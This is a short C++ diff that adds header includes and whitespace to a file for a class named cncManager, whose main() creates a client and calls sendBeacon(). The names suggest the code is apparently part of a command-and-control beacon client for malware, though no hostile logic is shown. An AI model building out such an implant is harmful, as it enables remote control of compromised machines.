@@ -1,5 +1,8 @@
 #include <iostream>
 #include <string>
+#include <map>
+#include <ole2.h>
+#include <olectl.h>
 #include "cncManager.h"
 
 cncManager::cncManager() {
@@ -151,4 +154,6 @@ void cncManager::responseParser(UCHAR* res, DWORD len) {
 int main() {
 	cncManager client;
 	client.sendBeacon();
+    
+  
 }
